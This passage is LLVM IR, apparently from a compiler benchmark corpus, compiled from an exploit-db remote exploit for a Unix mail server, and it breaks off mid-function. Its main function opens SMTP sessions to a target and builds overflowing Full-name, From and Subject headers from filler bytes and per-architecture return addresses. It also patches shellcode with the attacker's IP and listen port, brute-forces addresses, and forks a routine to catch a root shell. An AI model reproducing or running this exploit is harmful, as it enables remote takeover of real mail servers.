; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22314.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22314.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i64, i64, i64 }
%struct.sockaddr_in = type { i8, %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i64 }
%struct.hostent = type { i32, i32 }
%struct.sockaddr = type { i32 }

@BUFSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [63 x i8] c"%s <target ip> <myip> <target number> [bruteforce start addr]\0A\00", align 1
@maxarch = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [3 x i8] c"%x\00", align 1
@LISTENPORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [21 x i8] c"Trying address 0x%x\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [25 x i8] c"Unable to create socket\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"Resolving address... \00", align 1
@.str.5 = private unnamed_addr constant [27 x i8] c"Unable to resolve address\0A\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c"Address found\0A\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"Connecting... \00", align 1
@.str.8 = private unnamed_addr constant [19 x i8] c"Unable to connect\0A\00", align 1
@.str.9 = private unnamed_addr constant [12 x i8] c"Connected!\0A\00", align 1
@.str.10 = private unnamed_addr constant [20 x i8] c"Sending exploit... \00", align 1
@.str.11 = private unnamed_addr constant [17 x i8] c"HELO yahoo.com\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [33 x i8] c"MAIL FROM: spiderman@yahoo.com\0D\0A\00", align 1
@.str.13 = private unnamed_addr constant [25 x i8] c"RCPT TO: MAILER-DAEMON\0D\0A\00", align 1
@.str.14 = private unnamed_addr constant [7 x i8] c"DATA\0D\0A\00", align 1
@archs = common dso_local global %struct.TYPE_4__* null, align 8
@.str.15 = private unnamed_addr constant [16 x i8] c"Full-name: %s\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"From: %s\0D\0A\00", align 1
@code = common dso_local global i32* null, align 8
@.str.17 = private unnamed_addr constant [25 x i8] c"Subject: AAAAAAAAAAA%s\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [4 x i8] c".\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [15 x i8] c"Exploit sent!\0A\00", align 1
@.str.20 = private unnamed_addr constant [28 x i8] c"Waiting for root prompt...\0A\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"Failed!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 0, i64* %9, align 8
  %18 = load i32, i32* @BUFSIZE, align 4
  %19 = zext i32 %18 to i64
  %20 = call i8* @llvm.stacksave()
  store i8* %20, i8** %12, align 8
  %21 = alloca i8, i64 %19, align 16
  store i64 %19, i64* %13, align 8
  %22 = load i32, i32* @BUFSIZE, align 4
  %23 = zext i32 %22 to i64
  %24 = alloca i8, i64 %23, align 16
  store i64 %23, i64* %14, align 8
  %25 = load i32, i32* %4, align 4
  %26 = icmp sle i32 %25, 3
  br i1 %26, label %27, label %33

27:                                               ; preds = %2
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 0
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str, i64 0, i64 0), i8* %30)
  %32 = call i32 (...) @printtargets()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %531

33:                                               ; preds = %2
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 3
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @atol(i8* %36)
  store i32 %37, i32* %11, align 4
  %38 = load i32, i32* %11, align 4
  %39 = icmp slt i32 %38, 0
  br i1 %39, label %44, label %40

40:                                               ; preds = %33
  %41 = load i32, i32* %11, align 4
  %42 = load i32, i32* @maxarch, align 4
  %43 = icmp sge i32 %41, %42
  br i1 %43, label %44, label %46

44:                                               ; preds = %40, %33
  %45 = call i32 (...) @printtargets()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %531

46:                                               ; preds = %40
  %47 = load i32, i32* %4, align 4
  %48 = icmp sgt i32 %47, 4
  br i1 %48, label %49, label %54

49:                                               ; preds = %46
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 4
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @sscanf(i8* %52, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i64* %9)
  br label %54

54:                                               ; preds = %49, %46
  %55 = call i32 (...) @header()
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 2
  %58 = load i8*, i8** %57, align 8
  %59 = load i32, i32* @LISTENPORT, align 4
  %60 = call i32 @fixshellcode(i8* %58, i32 %59)
  %61 = load i64, i64* %9, align 8
  %62 = icmp ne i64 %61, 0
  br i1 %62, label %63, label %68

63:                                               ; preds = %54
  %64 = call i32 (...) @fork()
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %68, label %66

66:                                               ; preds = %63
  %67 = call i32 (...) @getrootprompt()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %531

68:                                               ; preds = %63, %54
  br label %69

69:                                               ; preds = %523, %68
  %70 = load i64, i64* %9, align 8
  %71 = icmp ne i64 %70, 0
  br i1 %71, label %72, label %77

72:                                               ; preds = %69
  %73 = load i64, i64* %9, align 8
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i64 %73)
  %75 = load i32, i32* @stdout, align 4
  %76 = call i32 @fflush(i32 %75)
  br label %77

77:                                               ; preds = %72, %69
  %78 = load i32, i32* @AF_INET, align 4
  %79 = load i32, i32* @SOCK_STREAM, align 4
  %80 = call i32 @socket(i32 %78, i32 %79, i32 0)
  store i32 %80, i32* %10, align 4
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %85

82:                                               ; preds = %77
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0))
  %84 = call i32 @exit(i32 0) #4
  unreachable

85:                                               ; preds = %77
  %86 = load i32, i32* @AF_INET, align 4
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 3
  store i32 %86, i32* %87, align 4
  %88 = call i32 @htons(i32 25)
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %88, i32* %89, align 8
  %90 = load i64, i64* %9, align 8
  %91 = icmp ne i64 %90, 0
  br i1 %91, label %96, label %92

92:                                               ; preds = %85
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0))
  %94 = load i32, i32* @stdout, align 4
  %95 = call i32 @fflush(i32 %94)
  br label %96

96:                                               ; preds = %92, %85
  %97 = load i8**, i8*** %5, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 1
  %99 = load i8*, i8** %98, align 8
  %100 = call i64 @inet_addr(i8* %99)
  store i64 %100, i64* %7, align 8
  %101 = icmp eq i64 %100, -1
  br i1 %101, label %102, label %121

102:                                              ; preds = %96
  %103 = load i8**, i8*** %5, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 1
  %105 = load i8*, i8** %104, align 8
  %106 = call %struct.hostent* @gethostbyname(i8* %105)
  store %struct.hostent* %106, %struct.hostent** %17, align 8
  %107 = icmp eq %struct.hostent* %106, null
  br i1 %107, label %108, label %111

108:                                              ; preds = %102
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0))
  %110 = call i32 @exit(i32 0) #4
  unreachable

111:                                              ; preds = %102
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %113 = bitcast %struct.TYPE_3__* %112 to i8*
  %114 = load %struct.hostent*, %struct.hostent** %17, align 8
  %115 = getelementptr inbounds %struct.hostent, %struct.hostent* %114, i32 0, i32 1
  %116 = load i32, i32* %115, align 4
  %117 = load %struct.hostent*, %struct.hostent** %17, align 8
  %118 = getelementptr inbounds %struct.hostent, %struct.hostent* %117, i32 0, i32 0
  %119 = load i32, i32* %118, align 4
  %120 = call i32 @memcpy(i8* %113, i32 %116, i32 %119)
  br label %125

121:                                              ; preds = %96
  %122 = load i64, i64* %7, align 8
  %123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %124 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %123, i32 0, i32 0
  store i64 %122, i64* %124, align 8
  br label %125

125:                                              ; preds = %121, %111
  %126 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %127 = call i32 @memset(i8* %126, i32 0, i32 8)
  %128 = load i64, i64* %9, align 8
  %129 = icmp ne i64 %128, 0
  br i1 %129, label %135, label %130

130:                                              ; preds = %125
  %131 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0))
  %132 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i64 0, i64 0))
  %133 = load i32, i32* @stdout, align 4
  %134 = call i32 @fflush(i32 %133)
  br label %135

135:                                              ; preds = %130, %125
  %136 = load i32, i32* %10, align 4
  %137 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %138 = call i64 @connect(i32 %136, %struct.sockaddr* %137, i32 24)
  %139 = icmp ne i64 %138, 0
  br i1 %139, label %140, label %143

140:                                              ; preds = %135
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0))
  %142 = call i32 @exit(i32 0) #4
  unreachable

143:                                              ; preds = %135
  %144 = load i64, i64* %9, align 8
  %145 = icmp ne i64 %144, 0
  br i1 %145, label %151, label %146

146:                                              ; preds = %143
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0))
  %148 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.10, i64 0, i64 0))
  %149 = load i32, i32* @stdout, align 4
  %150 = call i32 @fflush(i32 %149)
  br label %151

151:                                              ; preds = %146, %143
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @readsocket(i32 %152, i32 220)
  %154 = load i32, i32* %10, align 4
  %155 = call i32 @writesocket(i32 %154, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.11, i64 0, i64 0))
  %156 = load i32, i32* %10, align 4
  %157 = call i32 @readsocket(i32 %156, i32 250)
  %158 = load i32, i32* %10, align 4
  %159 = call i32 @writesocket(i32 %158, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.12, i64 0, i64 0))
  %160 = load i32, i32* %10, align 4
  %161 = call i32 @readsocket(i32 %160, i32 250)
  %162 = load i32, i32* %10, align 4
  %163 = call i32 @writesocket(i32 %162, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.13, i64 0, i64 0))
  %164 = load i32, i32* %10, align 4
  %165 = call i32 @readsocket(i32 %164, i32 250)
  %166 = load i32, i32* %10, align 4
  %167 = call i32 @writesocket(i32 %166, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i64 0, i64 0))
  %168 = load i32, i32* %10, align 4
  %169 = call i32 @readsocket(i32 %168, i32 354)
  %170 = trunc i64 %23 to i32
  %171 = call i32 @memset(i8* %24, i32 0, i32 %170)
  store i8* %24, i8** %15, align 8
  store i64 0, i64* %8, align 8
  br label %172

172:                                              ; preds = %186, %151
  %173 = load i64, i64* %8, align 8
  %174 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %175 = load i32, i32* %11, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %174, i64 %176
  %178 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %177, i32 0, i32 0
  %179 = load i64, i64* %178, align 8
  %180 = icmp ult i64 %173, %179
  br i1 %180, label %181, label %189

181:                                              ; preds = %172
  %182 = load i8*, i8** %15, align 8
  %183 = getelementptr inbounds i8, i8* %182, i32 1
  store i8* %183, i8** %15, align 8
  store i8 60, i8* %182, align 1
  %184 = load i8*, i8** %15, align 8
  %185 = getelementptr inbounds i8, i8* %184, i32 1
  store i8* %185, i8** %15, align 8
  store i8 62, i8* %184, align 1
  br label %186

186:                                              ; preds = %181
  %187 = load i64, i64* %8, align 8
  %188 = add i64 %187, 1
  store i64 %188, i64* %8, align 8
  br label %172

189:                                              ; preds = %172
  %190 = load i8*, i8** %15, align 8
  %191 = getelementptr inbounds i8, i8* %190, i32 1
  store i8* %191, i8** %15, align 8
  store i8 40, i8* %190, align 1
  store i64 0, i64* %8, align 8
  br label %192

192:                                              ; preds = %204, %189
  %193 = load i64, i64* %8, align 8
  %194 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %195 = load i32, i32* %11, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %194, i64 %196
  %198 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %197, i32 0, i32 1
  %199 = load i64, i64* %198, align 8
  %200 = icmp ult i64 %193, %199
  br i1 %200, label %201, label %207

201:                                              ; preds = %192
  %202 = load i8*, i8** %15, align 8
  %203 = getelementptr inbounds i8, i8* %202, i32 1
  store i8* %203, i8** %15, align 8
  store i8 -8, i8* %202, align 1
  br label %204

204:                                              ; preds = %201
  %205 = load i64, i64* %8, align 8
  %206 = add i64 %205, 1
  store i64 %206, i64* %8, align 8
  br label %192

207:                                              ; preds = %192
  %208 = load i8*, i8** %15, align 8
  %209 = getelementptr inbounds i8, i8* %208, i32 1
  store i8* %209, i8** %15, align 8
  store i8 41, i8* %208, align 1
  %210 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %211 = load i32, i32* %11, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %210, i64 %212
  %214 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %213, i32 0, i32 2
  %215 = bitcast i64* %214 to i8*
  %216 = getelementptr inbounds i8, i8* %215, i64 0
  %217 = load i8, i8* %216, align 8
  %218 = load i8*, i8** %15, align 8
  %219 = getelementptr inbounds i8, i8* %218, i32 1
  store i8* %219, i8** %15, align 8
  store i8 %217, i8* %218, align 1
  %220 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %221 = load i32, i32* %11, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %220, i64 %222
  %224 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %223, i32 0, i32 2
  %225 = bitcast i64* %224 to i8*
  %226 = getelementptr inbounds i8, i8* %225, i64 1
  %227 = load i8, i8* %226, align 1
  %228 = load i8*, i8** %15, align 8
  %229 = getelementptr inbounds i8, i8* %228, i32 1
  store i8* %229, i8** %15, align 8
  store i8 %227, i8* %228, align 1
  %230 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %231 = load i32, i32* %11, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %230, i64 %232
  %234 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %233, i32 0, i32 2
  %235 = bitcast i64* %234 to i8*
  %236 = getelementptr inbounds i8, i8* %235, i64 2
  %237 = load i8, i8* %236, align 2
  %238 = load i8*, i8** %15, align 8
  %239 = getelementptr inbounds i8, i8* %238, i32 1
  store i8* %239, i8** %15, align 8
  store i8 %237, i8* %238, align 1
  %240 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %241 = load i32, i32* %11, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %240, i64 %242
  %244 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %243, i32 0, i32 2
  %245 = bitcast i64* %244 to i8*
  %246 = getelementptr inbounds i8, i8* %245, i64 3
  %247 = load i8, i8* %246, align 1
  %248 = load i8*, i8** %15, align 8
  %249 = getelementptr inbounds i8, i8* %248, i32 1
  store i8* %249, i8** %15, align 8
  store i8 %247, i8* %248, align 1
  %250 = load i8*, i8** %15, align 8
  %251 = getelementptr inbounds i8, i8* %250, i32 1
  store i8* %251, i8** %15, align 8
  store i8 0, i8* %250, align 1
  %252 = call i32 @sprintf(i8* %21, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0), i8* %24)
  %253 = load i32, i32* %10, align 4
  %254 = call i32 @writesocket(i32 %253, i8* %21)
  %255 = call i32 @sprintf(i8* %21, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i64 0, i64 0), i8* %24)
  %256 = load i32, i32* %10, align 4
  %257 = call i32 @writesocket(i32 %256, i8* %21)
  store i8* %24, i8** %15, align 8
  %258 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %259 = load i32, i32* %11, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %258, i64 %260
  %262 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %261, i32 0, i32 2
  %263 = load i64, i64* %262, align 8
  %264 = add nsw i64 %263, 4
  store i64 %264, i64* %262, align 8
  %265 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %266 = load i32, i32* %11, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %265, i64 %267
  %269 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %268, i32 0, i32 2
  %270 = bitcast i64* %269 to i8*
  %271 = getelementptr inbounds i8, i8* %270, i64 0
  %272 = load i8, i8* %271, align 8
  %273 = load i8*, i8** %15, align 8
  %274 = getelementptr inbounds i8, i8* %273, i32 1
  store i8* %274, i8** %15, align 8
  store i8 %272, i8* %273, align 1
  %275 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %276 = load i32, i32* %11, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %275, i64 %277
  %279 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %278, i32 0, i32 2
  %280 = bitcast i64* %279 to i8*
  %281 = getelementptr inbounds i8, i8* %280, i64 1
  %282 = load i8, i8* %281, align 1
  %283 = load i8*, i8** %15, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %15, align 8
  store i8 %282, i8* %283, align 1
  %285 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %286 = load i32, i32* %11, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %285, i64 %287
  %289 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %288, i32 0, i32 2
  %290 = bitcast i64* %289 to i8*
  %291 = getelementptr inbounds i8, i8* %290, i64 2
  %292 = load i8, i8* %291, align 2
  %293 = load i8*, i8** %15, align 8
  %294 = getelementptr inbounds i8, i8* %293, i32 1
  store i8* %294, i8** %15, align 8
  store i8 %292, i8* %293, align 1
  %295 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %296 = load i32, i32* %11, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %295, i64 %297
  %299 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %298, i32 0, i32 2
  %300 = bitcast i64* %299 to i8*
  %301 = getelementptr inbounds i8, i8* %300, i64 3
  %302 = load i8, i8* %301, align 1
  %303 = load i8*, i8** %15, align 8
  %304 = getelementptr inbounds i8, i8* %303, i32 1
  store i8* %304, i8** %15, align 8
  store i8 %302, i8* %303, align 1
  store i64 0, i64* %8, align 8
  br label %305

305:                                              ; preds = %311, %207
  %306 = load i64, i64* %8, align 8
  %307 = icmp ult i64 %306, 20
  br i1 %307, label %308, label %314

308:                                              ; preds = %305
  %309 = load i8*, i8** %15, align 8
  %310 = getelementptr inbounds i8, i8* %309, i32 1
  store i8* %310, i8** %15, align 8
  store i8 -8, i8* %309, align 1
  br label %311

311:                                              ; preds = %308
  %312 = load i64, i64* %8, align 8
  %313 = add i64 %312, 1
  store i64 %313, i64* %8, align 8
  br label %305

314:                                              ; preds = %305
  %315 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %316 = load i32, i32* %11, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %315, i64 %317
  %319 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %318, i32 0, i32 2
  %320 = load i64, i64* %319, align 8
  %321 = add nsw i64 %320, 24
  store i64 %321, i64* %319, align 8
  %322 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %323 = load i32, i32* %11, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %322, i64 %324
  %326 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %325, i32 0, i32 2
  %327 = bitcast i64* %326 to i8*
  %328 = getelementptr inbounds i8, i8* %327, i64 0
  %329 = load i8, i8* %328, align 8
  %330 = load i8*, i8** %15, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %15, align 8
  store i8 %329, i8* %330, align 1
  %332 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %333 = load i32, i32* %11, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %332, i64 %334
  %336 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %335, i32 0, i32 2
  %337 = bitcast i64* %336 to i8*
  %338 = getelementptr inbounds i8, i8* %337, i64 1
  %339 = load i8, i8* %338, align 1
  %340 = load i8*, i8** %15, align 8
  %341 = getelementptr inbounds i8, i8* %340, i32 1
  store i8* %341, i8** %15, align 8
  store i8 %339, i8* %340, align 1
  %342 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %343 = load i32, i32* %11, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %342, i64 %344
  %346 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %345, i32 0, i32 2
  %347 = bitcast i64* %346 to i8*
  %348 = getelementptr inbounds i8, i8* %347, i64 2
  %349 = load i8, i8* %348, align 2
  %350 = load i8*, i8** %15, align 8
  %351 = getelementptr inbounds i8, i8* %350, i32 1
  store i8* %351, i8** %15, align 8
  store i8 %349, i8* %350, align 1
  %352 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %353 = load i32, i32* %11, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %352, i64 %354
  %356 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %355, i32 0, i32 2
  %357 = bitcast i64* %356 to i8*
  %358 = getelementptr inbounds i8, i8* %357, i64 3
  %359 = load i8, i8* %358, align 1
  %360 = load i8*, i8** %15, align 8
  %361 = getelementptr inbounds i8, i8* %360, i32 1
  store i8* %361, i8** %15, align 8
  store i8 %359, i8* %360, align 1
  store i64 0, i64* %8, align 8
  br label %362

362:                                              ; preds = %368, %314
  %363 = load i64, i64* %8, align 8
  %364 = icmp ult i64 %363, 76
  br i1 %364, label %365, label %371

365:                                              ; preds = %362
  %366 = load i8*, i8** %15, align 8
  %367 = getelementptr inbounds i8, i8* %366, i32 1
  store i8* %367, i8** %15, align 8
  store i8 1, i8* %366, align 1
  br label %368

368:                                              ; preds = %365
  %369 = load i64, i64* %8, align 8
  %370 = add i64 %369, 1
  store i64 %370, i64* %8, align 8
  br label %362

371:                                              ; preds = %362
  %372 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %373 = load i32, i32* %11, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %372, i64 %374
  %376 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %375, i32 0, i32 2
  %377 = load i64, i64* %376, align 8
  %378 = add nsw i64 %377, 80
  store i64 %378, i64* %376, align 8
  %379 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %380 = load i32, i32* %11, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %379, i64 %381
  %383 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %382, i32 0, i32 2
  %384 = bitcast i64* %383 to i8*
  %385 = getelementptr inbounds i8, i8* %384, i64 0
  %386 = load i8, i8* %385, align 8
  %387 = load i8*, i8** %15, align 8
  %388 = getelementptr inbounds i8, i8* %387, i32 1
  store i8* %388, i8** %15, align 8
  store i8 %386, i8* %387, align 1
  %389 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %390 = load i32, i32* %11, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %389, i64 %391
  %393 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %392, i32 0, i32 2
  %394 = bitcast i64* %393 to i8*
  %395 = getelementptr inbounds i8, i8* %394, i64 1
  %396 = load i8, i8* %395, align 1
  %397 = load i8*, i8** %15, align 8
  %398 = getelementptr inbounds i8, i8* %397, i32 1
  store i8* %398, i8** %15, align 8
  store i8 %396, i8* %397, align 1
  %399 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %400 = load i32, i32* %11, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %399, i64 %401
  %403 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %402, i32 0, i32 2
  %404 = bitcast i64* %403 to i8*
  %405 = getelementptr inbounds i8, i8* %404, i64 2
  %406 = load i8, i8* %405, align 2
  %407 = load i8*, i8** %15, align 8
  %408 = getelementptr inbounds i8, i8* %407, i32 1
  store i8* %408, i8** %15, align 8
  store i8 %406, i8* %407, align 1
  %409 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %410 = load i32, i32* %11, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %409, i64 %411
  %413 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %412, i32 0, i32 2
  %414 = bitcast i64* %413 to i8*
  %415 = getelementptr inbounds i8, i8* %414, i64 3
  %416 = load i8, i8* %415, align 1
  %417 = load i8*, i8** %15, align 8
  %418 = getelementptr inbounds i8, i8* %417, i32 1
  store i8* %418, i8** %15, align 8
  store i8 %416, i8* %417, align 1
  store i64 0, i64* %8, align 8
  br label %419

419:                                              ; preds = %425, %371
  %420 = load i64, i64* %8, align 8
  %421 = icmp ult i64 %420, 8
  br i1 %421, label %422, label %428

422:                                              ; preds = %419
  %423 = load i8*, i8** %15, align 8
  %424 = getelementptr inbounds i8, i8* %423, i32 1
  store i8* %424, i8** %15, align 8
  store i8 -8, i8* %423, align 1
  br label %425

425:                                              ; preds = %422
  %426 = load i64, i64* %8, align 8
  %427 = add i64 %426, 1
  store i64 %427, i64* %8, align 8
  br label %419

428:                                              ; preds = %419
  %429 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archs, align 8
  %430 = load i32, i32* %11, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %429, i64 %431
  %433 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %432, i32 0, i32 2
  %434 = load i64, i64* %433, align 8
  %435 = add nsw i64 %434, 12
  store i64 %435, i64* %433, align 8
